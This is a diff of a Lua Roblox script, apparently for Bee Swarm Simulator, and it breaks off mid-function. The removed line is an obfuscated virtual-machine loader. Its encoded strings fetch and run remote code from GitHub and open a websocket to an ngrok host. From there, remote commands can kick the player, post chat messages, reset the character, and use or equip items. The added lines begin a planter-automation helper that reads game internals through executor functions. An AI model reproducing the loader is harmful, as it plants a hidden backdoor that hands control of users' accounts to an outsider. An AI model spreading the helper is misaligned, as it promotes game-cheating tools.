@@ -1,1 +1,436 @@
-local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v82=0;while true do if (v82==0) then v19=v0(v3(v30,1,1));return "";end end else local v83=v2(v0(v30,16));if v19 then local v90=0;local v91;while true do if (v90==1) then return v91;end if (v90==0) then v91=v5(v83,v19);v19=nil;v90=1;end end else return v83;end end end);local function v20(v31,v32,v33)if v33 then local v84=0 -0 ;local v85;while true do if (v84==(0 -0)) then v85=(v31/((3 -1)^(v32-1)))%(((1641 -(1523 + 114)) -2)^(((v33-(620 -(555 + 64))) -(v32-(932 -(857 + 74)))) + 1 + 0)) ;return v85-(v85%(569 -(367 + 201))) ;end end else local v86=927 -(214 + 713) ;local v87;while true do if (v86==(0 + (0 -0))) then v87=2^(v32-((1066 -(68 + 997)) + 0)) ;return (((v31%(v87 + v87))>=v87) and 1) or (877 -(282 + 595)) ;end end end end local function v21()local v34=1270 -(226 + 1044) ;local v35;while true do if (v34==(4 -3)) then return v35;end if (v34==(117 -(32 + 85))) then v35=v1(v16,v18,v18);v18=v18 + 1 ;v34=1 + 0 ;end end end local function v22()local v36,v37=v1(v16,v18,v18 + 2 );v18=v18 + 1 + 1 ;return (v37 * (1213 -(892 + 65))) + v36 ;end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + 3 );v18=v18 + 4 ;return (v41 * (40022563 -23245347)) + (v40 * (121138 -55602)) + (v39 * (469 -213)) + v38 ;end local function v24()local v42=v23();local v43=v23();local v44=(1120 -769) -((273 -186) + 263) ;local v45=(v20(v43,181 -(67 + 113) ,15 + 5 ) * ((4 -2)^(24 + 8))) + v42 ;local v46=v20(v43,83 -62 ,983 -(802 + 150) );local v47=((v20(v43,85 -53 )==((19 -(10 + 8)) -(0 -0))) and  -(1 + 0)) or ((429 + 569) -(915 + 82)) ;if (v46==(0 -0)) then if (v45==0) then return v47 * (0 + (0 -0)) ;else local v92=0 -0 ;while true do if (v92==0) then v46=(1630 -(416 + 26)) -((1507 -(145 + 293)) + 118) ;v44=0 -0 ;break;end end end elseif (v46==2047) then return ((v45==(0 -0)) and (v47 * ((1 + 0)/(0 -(430 -(44 + 386)))))) or (v47 * NaN) ;end return v8(v47,v46-(1015 + (1494 -(998 + 488))) ) * (v44 + (v45/((793 -(368 + 423))^52))) ;end local function v25(v48)local v49;if  not v48 then v48=v23();if (v48==(0 + 0)) then return "";end end v49=v3(v16,v18,(v18 + v48) -1 );v18=v18 + v48 ;local v50={};for v66=1 + 0 , #v49 do v50[v66]=v2(v1(v3(v49,v66,v66)));end return v6(v50);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v51=0;local v52;local v53;local v54;local v55;local v56;local v57;local v58;local v59;while true do if (1==v51) then v54=nil;v55=nil;v51=2;end if (v51~=4) then else while true do if (v52~=2) then else local v99=0;while true do if (v99==(0 + 0)) then local v102=0 -0 ;while true do if (v102==(0 -0)) then v57=nil;v58=nil;v102=2 -1 ;end if (v102==1) then v99=286 -(134 + 151) ;break;end end end if (1~=v99) then else v52=1668 -(970 + 695) ;break;end end end if (v52==0) then v53=0 -0 ;v54=nil;v52=1991 -(582 + 1408) ;end if (v52~=1) then else local v100=0 -0 ;while true do if (v100==0) then v55=nil;v56=nil;v100=1 -0 ;end if (1~=v100) then else v52=7 -5 ;break;end end end if (v52==3) then v59=nil;while true do local v101=1824 -(1195 + 629) ;while true do if (v101==1) then if (v53==(1 -0)) then local v105=0;while true do if (v105==(241 -(187 + 54))) then local v108=780 -(162 + 618) ;local v109;while true do if (v108~=0) then else v109=0 + 0 ;while true do if (v109==(0 + 0)) then local v233=0;while true do if (1~=v233) then else v109=1 -0 ;break;end if (0~=v233) then else v57={v54,v55,nil,v56};v58=v23();v233=1;end end end if (v109==(1637 -(1373 + 263))) then v105=1;break;end end break;end end end if (v105==1) then v59={};v53=1002 -(451 + 549) ;break;end end end if (v53==0) then local v106=0;local v107;while true do if (v106==(0 + 0)) then v107=0;while true do if (v107~=(1 -0)) then else v56={};v53=1;break;end if (v107==(0 -0)) then local v193=1384 -(746 + 638) ;local v194;while true do if (v193==0) then v194=0;while true do if (v194==(0 + 0)) then local v235=0 -0 ;while true do if (v235==0) then v54={};v55={};v235=1;end if (v235==1) then v194=342 -(218 + 123) ;break;end end end if (v194~=(1582 -(1535 + 46))) then else v107=1 + 0 ;break;end end break;end end end end break;end end end break;end if ((0 + 0)==v101) then local v103=0;local v104;while true do if (v103==(560 -(306 + 254))) then v104=0;while true do if (v104~=(1 + 0)) then else v101=1;break;end if (v104~=0) then else if (v53~=2) then else local v195=0 -0 ;local v196;while true do if (0==v195) then v196=1467 -(899 + 568) ;while true do if (v196~=0) then else for v237=1 + 0 ,v58 do local v238=0;local v239;local v240;while true do if (v238==(2 -1)) then if (v239==1) then v240=v21()~=(603 -(268 + 335)) ;elseif (v239==(292 -(60 + 230))) then v240=v24();elseif (v239==(575 -(426 + 146))) then v240=v25();end v59[v237]=v240;break;end if (v238==(0 + 0)) then local v250=0;while true do if (v250~=0) then else v239=v21();v240=nil;v250=1457 -(282 + 1174) ;end if (v250==1) then v238=1;break;end end end end end v57[814 -(569 + 242) ]=v21();v196=2 -1 ;end if (v196==(1 + 0)) then for v241=1025 -(706 + 318) ,v23() do local v242=1251 -(721 + 530) ;local v243;local v244;local v245;local v246;while true do if (v242==2) then while true do if (1==v243) then v246=nil;while true do if (v244==0) then v245=0;v246=nil;v244=1272 -(945 + 326) ;end if (v244==1) then while true do if (v245~=0) then else v246=v21();if (v20(v246,1,1)==(0 -0)) then local v252=0 + 0 ;local v253;local v254;local v255;while true do if (v252~=(700 -(271 + 429))) then else v253=v20(v246,2 + 0 ,3);v254=v20(v246,1504 -(1408 + 92) ,1092 -(461 + 625) );v252=1;end if (2~=v252) then else local v256=0;while true do if (v256==1) then v252=3;break;end if (v256~=(1288 -(993 + 295))) then else local v262=0;while true do if (v262~=0) then else if (v20(v254,1,1 + 0 )~=1) then else v255[2]=v59[v255[1173 -(418 + 753) ]];end if (v20(v254,2,1 + 1 )==1) then v255[3]=v59[v255[3]];end v262=1 + 0 ;end if (v262~=(1 + 0)) then else v256=1 + 0 ;break;end end end end end if (v252~=1) then else v255={v22(),v22(),nil,nil};if (v253==(1322 -(1249 + 73))) then local v258=0 + 0 ;local v259;while true do if (v258~=(1145 -(466 + 679))) then else v259=0;while true do if (v259==(0 -0)) then v255[3]=v22();v255[11 -7 ]=v22();break;end end break;end end elseif (v253==1) then v255[1903 -(106 + 1794) ]=v23();elseif (v253==2) then v255[3]=v23() -(2^(6 + 10)) ;elseif (v253~=3) then else local v271=0;local v272;local v273;while true do if (v271==(0 + 0)) then v272=0 -0 ;v273=nil;v271=2 -1 ;end if (v271==(115 -(4 + 110))) then while true do if (v272~=(584 -(57 + 527))) then else v273=1427 -(41 + 1386) ;while true do if (0~=v273) then else v255[106 -(17 + 86) ]=v23() -((2 + 0)^16) ;v255[8 -4 ]=v22();break;end end break;end end break;end end end v252=2;end if ((8 -5)==v252) then if (v20(v254,169 -(122 + 44) ,3)~=(1 -0)) then else v255[4]=v59[v255[12 -8 ]];end v54[v241]=v255;break;end end end break;end end break;end end break;end if (v243~=0) then else local v251=0 + 0 ;while true do if (v251==(1 + 0)) then v243=1 -0 ;break;end if (v251~=(65 -(30 + 35))) then else v244=0;v245=nil;v251=1 + 0 ;end end end end break;end if (0~=v242) then else v243=1257 -(1043 + 214) ;v244=nil;v242=3 -2 ;end if (v242==1) then v245=nil;v246=nil;v242=2;end end end v53=3;break;end end break;end end end if (3==v53) then local v197=1212 -(323 + 889) ;while true do if (v197==0) then local v234=0;while true do if ((0 -0)~=v234) then else for v247=581 -(361 + 219) ,v23() do v55[v247-1 ]=v28();end return v57;end end end end end v104=321 -(53 + 267) ;end end break;end end end end end break;end end break;end if (v51==(1 + 1)) then v56=nil;v57=nil;v51=416 -(15 + 398) ;end if (v51==(985 -(18 + 964))) then v58=nil;v59=nil;v51=4;end if (0==v51) then v52=0 -0 ;v53=nil;v51=1;end end end local function v29(v60,v61,v62)local v63=v60[1];local v64=v60[2];local v65=v60[3];return function(...)local v68=v63;local v69=v64;local v70=v65;local v71=v27;local v72=1;local v73= -1;local v74={};local v75={...};local v76=v12("#",...) -1 ;local v77={};local v78={};for v88=0,v76 do if (v88>=v70) then v74[v88-v70 ]=v75[v88 + 1 ];else v78[v88]=v75[v88 + 1 ];end end local v79=(v76-v70) + 1 ;local v80;local v81;while true do local v89=0;while true do if (v89==1) then if (v81<=25) then if (v81<=12) then if (v81<=5) then if (v81<=2) then if (v81<=0) then v78[v80[2]][v80[3]]=v78[v80[4]];elseif (v81==1) then local v129=v80[2];v78[v129](v13(v78,v129 + 1 ,v80[3]));else v78[v80[2]]=v78[v80[3]];end elseif (v81<=3) then do return;end elseif (v81>4) then v78[v80[2]]=v78[v80[3]][v80[4]];else v62[v80[3]]=v78[v80[2]];end elseif (v81<=8) then if (v81<=6) then if (v78[v80[2]]==v78[v80[4]]) then v72=v72 + 1 ;else v72=v80[3];end elseif (v81==7) then local v137=v80[2];local v138,v139=v71(v78[v137](v13(v78,v137 + 1 ,v80[3])));v73=(v139 + v137) -1 ;local v140=0;for v198=v137,v73 do v140=v140 + 1 ;v78[v198]=v138[v140];end else v78[v80[2]]=v29(v69[v80[3]],nil,v62);end elseif (v81<=10) then if (v81==9) then local v142=0;local v143;while true do if (v142==0) then v143=v80[2];v78[v143]=v78[v143]();break;end end else v78[v80[2]]=v80[3];end elseif (v81==11) then local v146=v80[2];v78[v146]=v78[v146](v78[v146 + 1 ]);elseif (v78[v80[2]]==v80[4]) then v72=v72 + 1 ;else v72=v80[3];end elseif (v81<=18) then if (v81<=15) then if (v81<=13) then local v112=v80[2];local v113=v78[v80[3]];v78[v112 + 1 ]=v113;v78[v112]=v113[v80[4]];elseif (v81==14) then if (v78[v80[2]]==v80[4]) then v72=v72 + 1 ;else v72=v80[3];end elseif (v78[v80[2]]~=v80[4]) then v72=v72 + 1 ;else v72=v80[3];end elseif (v81<=16) then do return;end elseif (v81>17) then local v148=v80[2];v78[v148]=v78[v148](v13(v78,v148 + 1 ,v73));else v72=v80[3];end elseif (v81<=21) then if (v81<=19) then v78[v80[2]]=v78[v80[3]][v80[4]];elseif (v81==20) then for v201=v80[2],v80[3] do v78[v201]=nil;end else local v151=v80[2];v78[v151]=v78[v151](v13(v78,v151 + 1 ,v80[3]));end elseif (v81<=23) then if (v81==22) then v62[v80[3]]=v78[v80[2]];else v78[v80[2]][v80[3]]=v80[4];end elseif (v81==24) then local v157=v80[2];v78[v157](v78[v157 + 1 ]);elseif (v80[2]==v78[v80[4]]) then v72=v72 + 1 ;else v72=v80[3];end elseif (v81<=38) then if (v81<=31) then if (v81<=28) then if (v81<=26) then local v119=0;local v120;local v121;while true do if (v119==0) then v120=v80[2];v121=v80[3];v119=1;end if (v119==1) then for v221=v120,v121 do v78[v221]=v74[v221-v120 ];end break;end end elseif (v81==27) then local v158=v80[2];local v159,v160=v71(v78[v158](v13(v78,v158 + 1 ,v80[3])));v73=(v160 + v158) -1 ;local v161=0;for v205=v158,v73 do v161=v161 + 1 ;v78[v205]=v159[v161];end else v78[v80[2]]=v29(v69[v80[3]],nil,v62);end elseif (v81<=29) then v78[v80[2]][v80[3]]=v80[4];elseif (v81>30) then local v163=v80[3];local v164=v78[v163];for v208=v163 + 1 ,v80[4] do v164=v164   .. v78[v208] ;end v78[v80[2]]=v164;else local v166=v80[2];v78[v166](v78[v166 + 1 ]);end elseif (v81<=34) then if (v81<=32) then local v124=v80[2];v78[v124](v13(v78,v124 + 1 ,v80[3]));elseif (v81>33) then v78[v80[2]]=v62[v80[3]];else local v169=0;local v170;local v171;while true do if (v169==1) then v78[v170 + 1 ]=v171;v78[v170]=v171[v80[4]];break;end if (v169==0) then v170=v80[2];v171=v78[v80[3]];v169=1;end end end elseif (v81<=36) then if (v81>35) then v72=v80[3];else local v173=v80[2];v78[v173]=v78[v173](v13(v78,v173 + 1 ,v73));end elseif (v81>37) then local v175=v80[2];v78[v175]=v78[v175](v13(v78,v175 + 1 ,v80[3]));elseif (v78[v80[2]]==v78[v80[4]]) then v72=v72 + 1 ;else v72=v80[3];end elseif (v81<=44) then if (v81<=41) then if (v81<=39) then v78[v80[2]][v80[3]]=v78[v80[4]];elseif (v81==40) then local v177=v80[2];v78[v177]=v78[v177]();else local v179=v80[2];local v180=v80[3];for v209=v179,v180 do v78[v209]=v74[v209-v179 ];end end elseif (v81<=42) then if (v78[v80[2]]~=v80[4]) then v72=v72 + 1 ;else v72=v80[3];end elseif (v81==43) then v78[v80[2]]=v78[v80[3]];else v78[v80[2]]=v62[v80[3]];end elseif (v81<=47) then if (v81<=45) then local v127=0;local v128;while true do if (v127==0) then v128=v80[2];v78[v128]=v78[v128](v78[v128 + 1 ]);break;end end elseif (v81>46) then local v186=v80[3];local v187=v78[v186];for v214=v186 + 1 ,v80[4] do v187=v187   .. v78[v214] ;end v78[v80[2]]=v187;else v78[v80[2]]=v80[3];end elseif (v81<=49) then if (v81>48) then if (v80[2]==v78[v80[4]]) then v72=v72 + 1 ;else v72=v80[3];end else for v215=v80[2],v80[3] do v78[v215]=nil;end end elseif (v81>50) then v78[v80[2]]={};else v78[v80[2]]={};end v72=v72 + 1 ;break;end if (0==v89) then v80=v68[v72];v81=v80[1];v89=1;end end end end;end return v29(v28(),{},v17)(...);end v15("LOL!1B3O00028O00026O00F03F03093O006571756970742O6F6C03073O007573656974656D030D3O006571756970612O6365736F7279026O00104003073O0067657467656E7603023O007773027O004003083O00726567697374657203053O007265736574034O0003043O006B69636B03043O0063686174026O00084003043O00696E697403043O0067616D65030A3O004765745365727669636503073O00506C6179657273030B3O004C6F63616C506C6179657203043O004E616D65030A3O006C6F6164737472696E6703073O00482O747047657403463O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F54686547757946726F6D425354442F426F786D6F632F6D61696E2F776562736F636B65742O033O006E6577031C3O0077733A2O2F372E7463702E65752E6E67726F6B2E696F3A31352O39342O033O0075736500703O00120A3O00014O0014000100033O00260C3O0069000100020004243O006900012O0014000300033O00260C00010016000100010004243O0016000100120A000400013O00260C0004000E000100020004243O000E000100020800055O001216000500033O00120A000100023O0004243O00160001000E3100010008000100040004243O00080001000208000500013O001216000500043O000208000500023O001216000500053O00120A000400023O0004243O0008000100260C0001001C000100060004243O001C0001001222000400074O00090004000100020010270004000800030004243O006F000100260C00010036000100090004243O0036000100120A000400013O00260C0004002C000100010004243O002C000100200D00050003000A00120A0007000B3O00120A0008000C3O000208000900034O000100050009000100200D00050003000A00120A0007000D3O00120A0008000C3O000208000900044O000100050009000100120A000400023O00260C0004001F000100020004243O001F000100200D00050003000A00120A0007000E3O00120A0008000C3O000208000900054O000100050009000100120A0001000F3O0004243O003600010004243O001F000100260C00010055000100020004243O0055000100120A000400013O00260C00040045000100020004243O0045000100200D000500030010001222000700113O00200D00070007001200120A000900134O00150007000900020020130007000700140020130007000700152O000100050007000100120A000100093O0004243O0055000100260C00040039000100010004243O00390001001222000500163O001222000600113O00200D00060006001700120A000800184O001B000600084O001200053O00022O00090005000100022O002B000200053O00201300050002001900120A0006001A4O000B0005000200022O002B000300053O00120A000400023O0004243O0039000100260C000100050001000F0004243O0005000100200D00040003000A00120A0006001B3O00120A0007000C3O000208000800064O000100040008000100200D00040003000A00120A000600033O00120A0007000C3O000208000800074O000100040008000100200D00040003000A00120A000600053O00120A0007000C3O000208000800084O000100040008000100120A000100063O0004243O000500010004243O006F000100260C3O0002000100010004243O0002000100120A000100014O0014000200023O00120A3O00023O0004243O000200012O00103O00013O00093O000E3O00028O00026O00F03F03053O00457175697003043O004D7574652O0103043O005479706503083O0043617465676F727903093O00436F2O6C6563746F7203043O0067616D65030A3O004765745365727669636503113O005265706C69636174656453746F7261676503063O004576656E747303103O004974656D5061636B6167654576656E74030C3O00496E766F6B65536572766572012C3O00120A000100014O0014000200043O00260C00010007000100010004243O0007000100120A000200014O0014000300033O00120A000100023O00260C00010002000100020004243O000200012O0014000400043O00260C0002001B000100010004243O001B000100120A000500013O00260C00050011000100020004243O0011000100120A000200023O0004243O001B000100260C0005000D000100010004243O000D000100120A000300034O003200063O0003003017000600040005001027000600063O0030170006000700082O002B000400063O00120A000500023O0004243O000D000100260C0002000A000100020004243O000A0001001222000500093O00200D00050005000A00120A0007000B4O001500050007000200201300050005000C00201300050005000D00200D00050005000E2O002B000700034O002B000800044O00010005000800010004243O002B00010004243O000A00010004243O002B00010004243O000200012O00103O00017O00073O0003043O0067616D65030A3O004765745365727669636503113O005265706C69636174656453746F7261676503063O004576656E747303143O00506C6179657241637469766573436F2O6D616E64030A3O004669726553657276657203043O004E616D65010B3O001222000100013O00200D00010001000200120A000300034O001500010003000200201300010001000400201300010001000500200D0001000100062O003200033O0001001027000300074O00010001000300012O00103O00017O000C3O00028O00026O00F03F03043O0067616D65030A3O004765745365727669636503113O005265706C69636174656453746F7261676503063O004576656E747303103O004974656D5061636B6167654576656E74030C3O00496E766F6B6553657276657203053O00457175697003083O0043617465676F727903093O00412O63652O736F727903043O0054797065012B3O00120A000100014O0014000200043O00260C00010007000100010004243O0007000100120A000200014O0014000300033O00120A000100023O00260C00010002000100020004243O000200012O0014000400043O00260C00020017000100020004243O00170001001222000500033O00200D00050005000400120A000700054O001500050007000200201300050005000600201300050005000700200D0005000500082O002B000700034O002B000800044O00010005000800010004243O002A000100260C0002000A000100010004243O000A000100120A000500013O00260C0005001E000100020004243O001E000100120A000200023O0004243O000A000100260C0005001A000100010004243O001A000100120A000300094O003200063O00020030170006000A000B0010270006000C4O002B000400063O00120A000500023O0004243O001A00010004243O000A00010004243O002A00010004243O000200012O00103O00017O00083O00028O00026O00F03F03043O0067616D6503073O00506C6179657273030B3O004C6F63616C506C6179657203043O004E616D6503093O00436861726163746572030B3O00427265616B4A6F696E7473001D3O00120A000100014O0014000200033O00260C00010016000100020004243O0016000100260C00020004000100010004243O000400012O0029000300043O001222000400033O0020130004000400040020130004000400050020130004000400060006250004001C000100030004243O001C0001001222000400033O00201300040004000400201300040004000500201300040004000700200D0004000400082O001E0004000200010004243O001C00010004243O000400010004243O001C000100260C00010002000100010004243O0002000100120A000200014O0014000300033O00120A000100023O0004243O000200012O00103O00017O000A3O00028O00026O00F03F03043O0067616D6503073O00506C6179657273030B3O004C6F63616C506C6179657203043O004E616D6503043O004B69636B027O004003053O0073706C697403013O0020001C3O00120A000100014O0014000200033O00260C00010012000100020004243O00120001001222000400033O0020130004000400040020130004000400050020130004000400060020130005000300020006250004001B000100050004243O001B0001001222000400033O00201300040004000400201300040004000500200D0004000400070020130006000300082O00010004000600010004243O001B000100260C00010002000100010004243O000200012O0029000200033O00200D00040002000900120A0006000A4O00150004000600022O002B000300043O00120A000100023O0004243O000200012O00103O00017O00103O00028O00026O00F03F03053O0073706C697403013O002003043O0067616D6503073O00506C6179657273030B3O004C6F63616C506C6179657203043O004E616D65030A3O004765745365727669636503113O005265706C69636174656453746F72616765030C3O0057616974466F724368696C64031B3O0044656661756C744368617453797374656D436861744576656E747303113O005361794D652O7361676552657175657374030A3O0046697265536572766572027O00402O033O00412O6C00363O00120A000100014O0014000200043O000E3100010007000100010004243O0007000100120A000200014O0014000300033O00120A000100023O00260C00010002000100020004243O000200012O0014000400043O00260C0002001A000100010004243O001A000100120A000500013O000E3100020011000100050004243O0011000100120A000200023O0004243O001A000100260C0005000D000100010004243O000D00012O0029000300043O00200D00060003000300120A000800044O00150006000800022O002B000400063O00120A000500023O0004243O000D000100260C0002000A000100020004243O000A0001001222000500053O00201300050005000600201300050005000700201300050005000800201300060004000200062500050035000100060004243O00350001001222000500053O00200D00050005000900120A0007000A4O001500050007000200200D00050005000B00120A0007000C4O001500050007000200200D00050005000B00120A0007000D4O001500050007000200200D00050005000E00201300070004000F00120A000800104O00010005000800010004243O003500010004243O000A00010004243O003500010004243O000200012O00103O00017O000A3O00028O0003053O0073706C697403013O0020026O00F03F03043O0067616D6503073O00506C6179657273030B3O004C6F63616C506C6179657203043O004E616D6503073O007573656974656D027O004000193O00120A000100014O0014000200033O000E310001000A000100010004243O000A00012O0029000200033O00200D00040002000200120A000600034O00150004000600022O002B000300043O00120A000100043O00260C00010002000100040004243O00020001001222000400053O00201300040004000600201300040004000700201300040004000800201300050003000400062500040018000100050004243O00180001001222000400093O00201300050003000A2O001E0004000200010004243O001800010004243O000200012O00103O00017O000B3O0003053O0073706C697403013O002003043O0067616D6503073O00506C6179657273030B3O004C6F63616C506C6179657203043O004E616D65026O00F03F026O0008400003093O006571756970742O6F6C027O004000234O0029000100023O00200D00020001000100120A000400024O0015000200040002001222000300033O00201300030003000400201300030003000500201300030003000600201300040002000700062500030012000100040004243O0012000100201300030002000800260C00030012000100090004243O001200010012220003000A3O00201300040002000B2O001E0003000200010004243O00220001001222000300033O00201300030003000400201300030003000500201300030003000600201300040002000700062500030022000100040004243O0022000100201300030002000800262A00030022000100090004243O002200010012220003000A3O00201300040002000B00120A000500023O0020130006000200082O002F0004000400062O001E0003000200012O00103O00017O000A3O00028O00026O00F03F03043O0067616D6503073O00506C6179657273030B3O004C6F63616C506C6179657203043O004E616D65030D3O006571756970612O6365736F7279027O004003053O0073706C697403013O002000213O00120A000100014O0014000200033O000E310002000F000100010004243O000F0001001222000400033O00201300040004000400201300040004000500201300040004000600201300050003000200062500040020000100050004243O00200001001222000400073O0020130005000300082O001E0004000200010004243O00200001000E3100010002000100010004243O0002000100120A000400013O00260C00040016000100020004243O0016000100120A000100023O0004243O0002000100260C00040012000100010004243O001200012O0029000200033O00200D00050002000900120A0007000A4O00150005000700022O002B000300053O00120A000400023O0004243O001200010004243O000200012O00103O00017O00",v9(),...);
+local nAPI = {}
+
+local planterData = {
+    
+  ["Red Clay"] = {
+    NectarTypes = {
+      Invigorating = 1.2,
+      Satisfying = 1.2
+    },
+    GrowthFields = {
+        ["Pepper Patch"] = 1.25,
+        ["Rose Field"] = 1.25,
+        ["Strawberry Field"] = 1.25,
+        ["Mushroom Field"] = 1.25
+    }
+  },
+
+  --[[Plenty = {
+    NectarTypes = {
+      Satisfying = 1.5,
+      Comforting = 1.5,
+      Invigorating = 1.5,
+      Refreshing = 1.5,
+      Motivating = 1.5
+    },
+    GrowthFields = {
+      ["Mountain Top Field"] = 1.5,
+      ["Coconut Field"] = 1.5,
+      ["Pepper Patch"] = 1.5,
+      ["Stump Field"] = 1.5
+    }
+  },]]
+  Tacky = {
+    NectarTypes = {
+      Satisfying = 1.25,
+      Comforting = 1.25
+    },
+    GrowthFields = {
+      ["Sunflower Field"] = 1.25,
+      ["Mushroom Field"] = 1.25,
+      ["Dandelion Field"] = 1.25,
+      ["Clover Field"] = 1.25,
+      ["Blue Flower Field"] = 1.25
+    }
+  },
+  --[[Festive = {
+    NectarTypes = {
+      Satisfying = 3,
+      Comforting = 3,
+      Invigorating = 3,
+      Refreshing = 3,
+      Motivating = 3
+    },
+    GrowthFields = { }
+  },]]
+  Candy = {
+    NectarTypes = {
+      Motivating = 1.2
+    },
+    GrowthFields = {
+      ["Coconut Field"] = 1.25,
+      ["Strawberry Field"] = 1.25,
+      ["Pineapple Patch"] = 1.25
+    }
+  },
+  Hydroponic = {
+    NectarTypes = {
+      Refreshing = 1.4,
+      Comforting = 1.4
+    },
+    GrowthFields = {
+        ["Blue Flower Field"] = 1.5,
+        ["Pine Tree Forest"] = 1.5,
+        ["Stump Field"] = 1.5,
+        ["Bamboo Field"] = 1.5,
+    }
+  },
+  Plastic = {
+    NectarTypes = {
+      Refreshing = 1,
+      Invigorating = 1,
+      Comforting = 1,
+      Satisfying = 1,
+      Motivating = 1
+    },
+    GrowthFields = {
+    }
+  },
+  Petal = {
+    NectarTypes = {
+      Satisfying = 1.5,
+      Comforting = 1.5
+    },
+    GrowthFields = {
+        ["Sunflower Field"] = 1.5,
+        ["Dandelion Field"] = 1.5,
+        ["Spider Field"] = 1.5,
+        ["Pineapple Patch"] = 1.5,
+        ["Coconut Field"] = 1.5,
+    }
+  },
+  ["Heat-Treated"] = {
+    NectarTypes = {
+      Invigorating = 1.4,
+      Motivating = 1.4
+    },
+    GrowthFields = {
+        ["Pepper Patch"] = 1.5,
+        ["Rose Field"] = 1.5,
+        ["Strawberry Field"] = 1.5,
+        ["Mushroom Field"] = 1.5
+    }
+  },
+  ["Blue Clay"] = {
+    NectarTypes = {
+      Refreshing = 1.2,
+      Comforting = 1.2
+    },
+    GrowthFields = {
+        ["Blue Flower Field"] = 1.25,
+        ["Pine Tree Forest"] = 1.25,
+        ["Stump Field"] = 1.25,
+        ["Bamboo Field"] = 1.25,
+    }
+  },
+  Paper = {
+    NectarTypes = {
+      Satisfying = 0.75,
+      Comforting = 0.75,
+      Invigorating = 0.75,
+      Refreshing = 0.75,
+      Motivating = 0.75
+    },
+    GrowthFields = { }
+  },
+  Pesticide = {
+    NectarTypes = {
+      Motivating = 1.3,
+      Satisfying = 1.3
+    },
+    GrowthFields = {
+      ["Strawberry Field"] = 1.3,
+      ["Spider Field"] = 1.3,
+      ["Bamboo Field"] = 1.3
+    }
+  }
+}
+
+local nectarData = {
+  Refreshing = { "Blue Flower Field", "Strawberry Field", "Coconut Field" },
+  Invigorating = { "Clover Field", "Cactus Field", "Mountain Top Field", "Pepper Patch" },
+  Comforting = { "Dandelion Field", "Bamboo Field", "Pine Tree Forest" },
+  Motivating = { "Mushroom Field", "Spider Field", "Stump Field", "Rose Field" },
+  Satisfying = { "Sunflower Field", "Pineapple Patch", "Pumpkin Patch" }
+}
+
+function nAPI:GetPlanterData(name) 
+    local concaccon = require(game:GetService("ReplicatedStorage").LocalPlanters)
+    local concacbo = concaccon.LoadPlanter
+    local PlanterTable = debug.getupvalues(concacbo)[4]
+    local tttttt = nil
+    for k,v in pairs(PlanterTable) do 
+        if v.PotModel and v.IsMine == true and string.find(v.PotModel.Name,name) then 
+            tttttt = v
+        end
+    end
+    return tttttt
+end
+
+local fullnectardata = require(game:GetService("ReplicatedStorage").NectarTypes).GetTypes()
+
+function nAPI:fetchNectarsData()
+    
+    local ndata = { Refreshing = "none", Invigorating = "none", Comforting = "none", Motivating = "none", Satisfying = "none" }
+    
+    if game:GetService("Players").LocalPlayer then
+        if game:GetService("Players").LocalPlayer.PlayerGui then
+            if game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui then
+                for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui:GetChildren()) do
+                    if v.Name == "TileGrid" then
+                        for p,l in pairs(v:GetChildren()) do
+                        for k,e in pairs(fullnectardata) do
+                            if l:FindFirstChild("BG") then
+                                if l:FindFirstChild("BG"):FindFirstChild("Icon") then
+                                    if l:FindFirstChild("BG"):FindFirstChild("Icon").ImageColor3 == e.Color then
+                                        local Xsize = l:FindFirstChild("BG").Bar.AbsoluteSize.X
+                                        local Ysize = l:FindFirstChild("BG").Bar.AbsoluteSize.Y
+                                        local percentage = (Ysize/Xsize)*100
+                                        ndata[k] = percentage
+                                    end
+                                end
+                            end
+                        end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    return ndata
+end
+
+function nAPI:isBlacklisted(nectartype,blacklist)
+    local bl = false
+    for i,v in pairs(blacklist) do if v == nectartype then bl = true end end
+    for i,v in pairs(getgenv().NectarBlacklist) do if v == nectartype then bl = true end end
+    return bl
+end
+
+function nAPI:calculateLeastNectar(blacklist)
+    local leastNectar = nil
+    local tempLeastValue = 999
+    
+    local nectarData = nAPI:fetchNectarsData()
+    for i,v in pairs(nectarData) do
+        if nAPI:isBlacklisted(i,blacklist) == false then
+        if v == "none" or v == nil then
+            leastNectar = i
+            tempLeastValue = 0
+        else
+            if v <= tempLeastValue then
+                tempLeastValue = v
+                leastNectar = i
+            end
+        end
+        end
+    end
+    print(leastNectar)
+    return leastNectar
+end
+
+function nAPI:GetItemListWithValue()
+    local StatCache = require(game.ReplicatedStorage.ClientStatCache)
+    local data = StatCache.Get()
+    return data.Eggs
+end
+
+function nAPI:fetchBestMatch(nectartype,field)
+    local bestPlanter = nil
+    local bestNectarMult = 0
+    for i,v in pairs(planterData) do
+        if nAPI:GetItemListWithValue()[i.."Planter"] then
+         if nAPI:GetItemListWithValue()[i.."Planter"] >= 1 then
+            if v.NectarTypes[nectartype] ~= nil then
+                local holderValue = 0
+                    holderValue = v.NectarTypes[nectartype]
+                    
+                    if v["GrowthFields"][field] ~= nil then
+                        holderValue = (holderValue * v["GrowthFields"][field])
+                    end
+                
+                    if holderValue > bestNectarMult then
+                        bestNectarMult = holderValue
+                        bestPlanter = i
+                    end
+                end
+            end
+        end
+    end
+    return bestPlanter
+end
+
+function nAPI:getPlanterLocation(plnt)
+    local resultingField = "None"
+    local lowestMag = math.huge
+    for i,v in pairs(game:GetService("Workspace").FlowerZones:GetChildren()) do
+        if (v.Position - plnt.Position).magnitude < lowestMag then
+            lowestMag = (v.Position - plnt.Position).magnitude
+            resultingField = v.Name
+        end
+    end
+return resultingField
+end
+
+function nAPI:isFieldOccupied(field)
+    local isOccupied=false
+    local concaccon = require(game:GetService("ReplicatedStorage").LocalPlanters)
+    local concacbo = concaccon.LoadPlanter
+    local PlanterTable = debug.getupvalues(concacbo)[4]
+    
+    for k,v in pairs(PlanterTable) do 
+        if v.PotModel and v.PotModel.Parent and v.PotModel.PrimaryPart then 
